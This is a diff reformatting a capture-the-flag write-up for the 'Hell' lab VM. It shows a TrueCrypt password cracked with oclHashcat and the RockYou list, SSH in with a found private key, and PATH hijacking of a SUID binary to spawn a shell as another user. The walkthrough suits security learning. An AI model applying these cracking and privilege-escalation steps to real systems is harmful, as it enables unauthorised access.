@@ -90,77 +90,136 @@
 
 <p>Mounting the TrueCrypt container requires us to know the container password, which we currently don&rsquo;t have.</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-george@hell:~$ truecrypt &ndash;mount container.tc
-Enter mount directory [default]:
-Enter password for /home/george/container.tc:
-Enter keyfile [none]:
-Protect hidden volume (if any)? (y=Yes/n=No) [No]:
-No password or keyfile specified.[/plain]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>george@hell:~<span class="nv">$ </span>truecrypt --mount container.tc
+</span><span class='line'>Enter mount directory <span class="o">[</span>default<span class="o">]</span>:
+</span><span class='line'>Enter password <span class="k">for</span> /home/george/container.tc:
+</span><span class='line'>Enter keyfile <span class="o">[</span>none<span class="o">]</span>:
+</span><span class='line'>Protect hidden volume <span class="o">(</span><span class="k">if</span> any<span class="o">)</span>? <span class="o">(</span><span class="nv">y</span><span class="o">=</span>Yes/n<span class="o">=</span>No<span class="o">)</span> <span class="o">[</span>No<span class="o">]</span>:
+</span><span class='line'>No password or keyfile specified.
+</span></code></pre></td></tr></table></div></figure>
+
 
 <p>Looking around a bit more, it looks like George has also signed up for RockYou</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-From: <a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#111;&#x3a;&#x61;&#100;&#x6d;&#x69;&#x6e;&#64;&#x72;&#111;&#99;&#107;&#121;&#111;&#x75;&#46;&#x63;&#x6f;&#x6d;">&#x61;&#100;&#109;&#105;&#x6e;&#x40;&#114;&#111;&#x63;&#107;&#x79;&#x6f;&#117;&#46;&#99;&#x6f;&#109;</a>
-To: <a href="&#x6d;&#97;&#105;&#108;&#116;&#111;&#x3a;&#115;&#117;&#112;&#101;&#114;&#x5f;&#x61;&#x64;&#x6d;&#x69;&#110;&#64;&#x68;&#101;&#108;&#108;&#x2e;&#x63;&#x6f;&#x6d;">&#115;&#117;&#112;&#101;&#x72;&#95;&#97;&#100;&#109;&#105;&#x6e;&#64;&#x68;&#x65;&#108;&#x6c;&#46;&#x63;&#111;&#109;</a>
-Subject: Account Activation
-Date: 13th November 2009</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>From: admin@rockyou.com
+</span><span class='line'>To: super_admin@hell.com
+</span><span class='line'>Subject: Account Activation
+</span><span class='line'>Date: 13th November 2009
+</span><span class='line'>
+</span><span class='line'>Thanks <span class="k">for</span> signing up <span class="k">for</span> your account. I hope you enjoy our services.
+</span></code></pre></td></tr></table></div></figure>
 
-<p>Thanks for signing up for your account. I hope you enjoy our services. [/plain]</p>
 
 <p><em>ka-ching</em> George&rsquo;s password will be on the leaked RockYou wordlist.  oclHashCat can help us out here, thanks to the ability to use GPU&rsquo;s.  Yes, I&rsquo;m using a Windows PC for this, sue me.</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-G:\Downloads\oclHashcat-1.21>oclHashcat64.exe -m 6211 -a 0 &ldquo;g:\downloads\container.tc&rdquo; g:\Downloads\dictionaries\catted\rockyou.txt</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>G:<span class="se">\D</span>ownloads<span class="se">\o</span>clHashcat-1.21&gt;oclHashcat64.exe -m <span class="m">6211</span> -a <span class="m">0</span> <span class="s2">&quot;g:\downloads\container.tc&quot;</span> g:<span class="se">\D</span>ownloads<span class="se">\d</span>ictionaries<span class="se">\c</span>atted<span class="se">\r</span>ockyou.txt
+</span><span class='line'>
+</span><span class='line'>g:<span class="se">\d</span>ownloads<span class="se">\c</span>ontainer.tc:letsyouupdateyourfunnotesandmore
+</span><span class='line'>
+</span><span class='line'>Session.Name...: oclHashcat
+</span><span class='line'>Status.........: Cracked
+</span><span class='line'>Input.Mode.....: File <span class="o">(</span>g:<span class="se">\D</span>ownloads<span class="se">\d</span>ictionaries<span class="se">\c</span>atted<span class="se">\r</span>ockyou.txt<span class="o">)</span>
+</span><span class='line'>Hash.Target....: File <span class="o">(</span>g:<span class="se">\d</span>ownloads<span class="se">\c</span>ontainer.tc<span class="o">)</span>
+</span><span class='line'>Hash.Type......: TrueCrypt 5.0+ PBKDF2-HMAC-RipeMD160 + AES
+</span><span class='line'>Time.Started...: Sat Jul <span class="m">12</span> 23:06:15 <span class="m">2014</span> <span class="o">(</span><span class="m">17</span> secs<span class="o">)</span>
+</span><span class='line'>Speed.GPU.#1...:    <span class="m">29889</span> H/s
+</span><span class='line'>Recovered......: 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests, 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Salts
+</span><span class='line'>Progress.......: 496641/14343296 <span class="o">(</span>3.46%<span class="o">)</span>
+</span><span class='line'>Skipped........: 0/496641 <span class="o">(</span>0.00%<span class="o">)</span>
+</span><span class='line'>Rejected.......: 1/496641 <span class="o">(</span>0.00%<span class="o">)</span>
+</span><span class='line'>HWMon.GPU.#1...: 97% Util, 56c Temp, 32% Fan
+</span><span class='line'>
+</span><span class='line'>Started: Sat Jul <span class="m">12</span> 23:06:15 2014
+</span><span class='line'>Stopped: Sat Jul <span class="m">12</span> 23:06:37 2014
+</span></code></pre></td></tr></table></div></figure>
 
-<p>g:\downloads\container.tc:letsyouupdateyourfunnotesandmore</p>
-
-<p>Session.Name&hellip;: oclHashcat
-Status&hellip;&hellip;&hellip;: Cracked
-Input.Mode&hellip;..: File (g:\Downloads\dictionaries\catted\rockyou.txt)
-Hash.Target&hellip;.: File (g:\downloads\container.tc)
-Hash.Type&hellip;&hellip;: TrueCrypt 5.0+ PBKDF2-HMAC-RipeMD160 + AES
-Time.Started&hellip;: Sat Jul 12 23:06:15 2014 (17 secs)
-Speed.GPU.#1&hellip;:    29889 H/s
-Recovered&hellip;&hellip;: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
-Progress&hellip;&hellip;.: 496641/14343296 (3.46%)
-Skipped&hellip;&hellip;..: 0/496641 (0.00%)
-Rejected&hellip;&hellip;.: 1/496641 (0.00%)
-HWMon.GPU.#1&hellip;: 97% Util, 56c Temp, 32% Fan</p>
-
-<p>Started: Sat Jul 12 23:06:15 2014
-Stopped: Sat Jul 12 23:06:37 2014[/plain]</p>
 
 <p>That didn&rsquo;t take too long now did it ?  But we have the TrueCrypt container password, which makes mounting it a tiny bit easier now.</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-george@hell:~$ truecrypt &ndash;mount container.tc
-Enter mount directory [default]: ./tc
-Enter password for /home/george/container.tc: letsyouupdateyourfunnotesandmore
-Enter keyfile [none]:
-Protect hidden volume (if any)? (y=Yes/n=No) [No]:</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>george@hell:~<span class="nv">$ </span>truecrypt --mount container.tc
+</span><span class='line'>Enter mount directory <span class="o">[</span>default<span class="o">]</span>: ./tc
+</span><span class='line'>Enter password <span class="k">for</span> /home/george/container.tc: letsyouupdateyourfunnotesandmore
+</span><span class='line'>Enter keyfile <span class="o">[</span>none<span class="o">]</span>:
+</span><span class='line'>Protect hidden volume <span class="o">(</span><span class="k">if</span> any<span class="o">)</span>? <span class="o">(</span><span class="nv">y</span><span class="o">=</span>Yes/n<span class="o">=</span>No<span class="o">)</span> <span class="o">[</span>No<span class="o">]</span>:
+</span><span class='line'>
+</span><span class='line'>george@hell:~<span class="nv">$ </span><span class="nb">cd </span>tc
+</span><span class='line'>george@hell:~/tc<span class="nv">$ </span>ls -l
+</span><span class='line'>total 2
+</span><span class='line'>-rwx------ <span class="m">1</span> george george <span class="m">1679</span> Jul  <span class="m">5</span> 20:01 id_rsa
+</span><span class='line'>george@hell:~/tc<span class="nv">$ </span>
+</span></code></pre></td></tr></table></div></figure>
 
-<p>george@hell:~$ cd tc
-george@hell:~/tc$ ls -l
-total 2
--rwx&mdash;&mdash; 1 george george 1679 Jul  5 20:01 id_rsa
-george@hell:~/tc$ [/plain]</p>
 
 <p>Hmm, a private key - lets try SSHing in as bazza using this key and see what happens.</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-george@hell:~/tc$ ssh <a href="&#x6d;&#97;&#105;&#108;&#x74;&#x6f;&#58;&#98;&#97;&#x7a;&#x7a;&#97;&#x40;&#49;&#50;&#x37;&#46;&#48;&#x2e;&#x30;&#x2e;&#49;">&#x62;&#97;&#x7a;&#122;&#x61;&#x40;&#x31;&#x32;&#x37;&#46;&#48;&#46;&#48;&#x2e;&#x31;</a> -i ./id_rsa
-Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>george@hell:~/tc<span class="nv">$ </span>ssh bazza@127.0.0.1 -i ./id_rsa
+</span><span class='line'>Linux hell 3.2.0-4-486 <span class="c">#1 Debian 3.2.57-3+deb7u2 i686</span>
+</span><span class='line'>
+</span><span class='line'>The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
+</span><span class='line'>the exact distribution terms <span class="k">for</span> each program are described in the
+</span><span class='line'>individual files in /usr/share/doc/*/copyright.
+</span><span class='line'>
+</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span><span class='line'>permitted by applicable law.
+</span><span class='line'>Last login: Sun Jul <span class="m">13</span> 21:18:28 <span class="m">2014</span> from 192.168.0.102
+</span><span class='line'><span class="nv">$ </span>whoami
+</span><span class='line'>bazza
+</span></code></pre></td></tr></table></div></figure>
 
-<p>The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.</p>
-
-<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Sun Jul 13 21:18:28 2014 from 192.168.0.102
-$ whoami
-bazza[/plain]</p>
 
 <p>Oh&hellip; I was expecting a bit more of a fight, but I guess Bazza trusts George, even though he uses defunct software that allows privilege escalation (look it up).  Fool.</p>
 
@@ -210,49 +269,86 @@ bazza[/plain]</p>
     }
   }
   return result;
-}[/c]</p>
+}</p>
 
-<p>OK, so part1 runs part2 (this time with an absolute path), so time for a quick peek into part2</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>OK, so part1 runs part2 <span class="o">(</span>this <span class="nb">time </span>with an absolute path<span class="o">)</span>, so <span class="nb">time </span><span class="k">for</span> a quick peek into part2
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>c<span class="o">]</span>int __cdecl main<span class="o">()</span>
+</span><span class='line'><span class="o">{</span>
+</span><span class='line'>  __gid_t v0<span class="p">;</span> // eax@2
+</span><span class='line'>  int result<span class="p">;</span> // eax@2
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span> <span class="o">(</span> getegid<span class="o">()</span> <span class="o">==</span> <span class="m">1003</span> <span class="o">)</span>
+</span><span class='line'>  <span class="o">{</span>
+</span><span class='line'>    puts<span class="o">(</span><span class="s2">&quot;\nCan&#39;t touch this *nah na na na na naaaaaaaa nah*&quot;</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'>    system<span class="o">(</span><span class="s2">&quot;id&quot;</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'>    <span class="nv">result</span> <span class="o">=</span> 0<span class="p">;</span>
+</span><span class='line'>  <span class="o">}</span>
+</span><span class='line'>  <span class="k">else</span>
+</span><span class='line'>  <span class="o">{</span>
+</span><span class='line'>    <span class="nv">v0</span> <span class="o">=</span> getegid<span class="o">()</span><span class="p">;</span>
+</span><span class='line'>    <span class="nb">printf</span><span class="o">(</span><span class="s2">&quot;\n\nError! %d ID detected ... you&#39;re not allowed to run this, please use part 1!\n&quot;</span>, v0<span class="o">)</span><span class="p">;</span>
+</span><span class='line'>    <span class="nv">result</span> <span class="o">=</span> 0<span class="p">;</span>
+</span><span class='line'>  <span class="o">}</span>
+</span><span class='line'>  <span class="k">return</span> result<span class="p">;</span>
+</span><span class='line'><span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure>
 
-<p>[c]int <strong>cdecl main()
-{
-  </strong>gid_t v0; // eax@2
-  int result; // eax@2</p>
-
-<p>  if ( getegid() == 1003 )
-  {
-    puts(&ldquo;\nCan&rsquo;t touch this <em>nah na na na na naaaaaaaa nah</em>&rdquo;);
-    system(&ldquo;id&rdquo;);
-    result = 0;
-  }
-  else
-  {
-    v0 = getegid();
-    printf(&ldquo;\n\nError! %d ID detected &hellip; you&rsquo;re not allowed to run this, please use part 1!\n&rdquo;, v0);
-    result = 0;
-  }
-  return result;
-}[/c]</p>
 
 <p>So, part2 will run only if the effective group identifier is 1003.  part1 has a SUID attribute set as group developers, which means you have to run part1 before part2.  If you run part2 first, this happens</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-Error! 1004 ID detected &hellip; you&rsquo;re not allowed to run this, please use part 1![/plain]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>Error! <span class="m">1004</span> ID detected ... you<span class="err">&#39;</span>re not allowed to run this, please use part 1!
+</span></code></pre></td></tr></table></div></figure>
+
 
 <p>Running part1 changes our effective group identifier, and part2 changes our effective user identifier, but doesn&rsquo;t seem to drop us to a shell as that user (oj)</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-$ ./part1
-Checking integrity of part2&hellip; Done!!</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>./part1
+</span><span class='line'>Checking integrity of part2... Done!!
+</span><span class='line'>
+</span><span class='line'>Checking integrity of calling target... Done!!
+</span><span class='line'>
+</span><span class='line'>Binary and target confirmed.
+</span><span class='line'>
+</span><span class='line'>Can<span class="err">&#39;</span>t touch this *nah na na na na naaaaaaaa nah*
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1004<span class="o">(</span>bazza<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1004<span class="o">(</span>bazza<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1005<span class="o">(</span>oj<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>1003<span class="o">(</span>developers<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1005<span class="o">(</span>oj<span class="o">)</span>,1004<span class="o">(</span>bazza<span class="o">)</span>
+</span><span class='line'><span class="nv">$ </span>whoami
+</span><span class='line'>bazza
+</span></code></pre></td></tr></table></div></figure>
 
-<p>Checking integrity of calling target&hellip; Done!!</p>
-
-<p>Binary and target confirmed.</p>
-
-<p>Can&rsquo;t touch this <em>nah na na na na naaaaaaaa nah</em>
-uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)
-$ whoami
-bazza[/plain]</p>
 
 <p>A further look into the source code for part2 shows that it is not using an absolute path for the system(&ldquo;id&rdquo;) function, therefore we can trick this application into running a bogus id binary in the same way we did with the bogus chmod binary.  The source code is pretty much the same, apart from the fact I&rsquo;m using uid 1005 rather than 1000.</p>
 
@@ -269,12 +365,16 @@ bazza[/plain]</p>
  setuid( 1005 );
  system(&ldquo;/usr/bin/id&rdquo;);
  system( &ldquo;/bin/sh -i&rdquo; );
-}[/c]</p>
+}</p>
 
-<p>This is compiled, placed in /tmp and made executable.  The path environment variable is modified as per last time and we&rsquo;re good to go.</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>This is compiled, placed in /tmp and made executable.  The path environment variable is modified as per last <span class="nb">time </span>and we<span class="err">&#39;</span>re good to go.
+</span></code></pre></td></tr></table></div></figure>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-$ ./part1
+
+<p> bash</p>
+
+<p>$ ./part1
 Checking integrity of part2&hellip; Done!!</p>
 
 <p>Checking integrity of calling target&hellip; Done!!</p>
@@ -284,8 +384,9 @@ Checking integrity of part2&hellip; Done!!</p>
 <p>Can&rsquo;t touch this <em>nah na na na na naaaaaaaa nah</em>
 uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)
 $ whoami
-oj
-[/plain]</p>
+oj</p>
+
+<p>&#8220;`</p>
 
 <p>Success !</p>
 
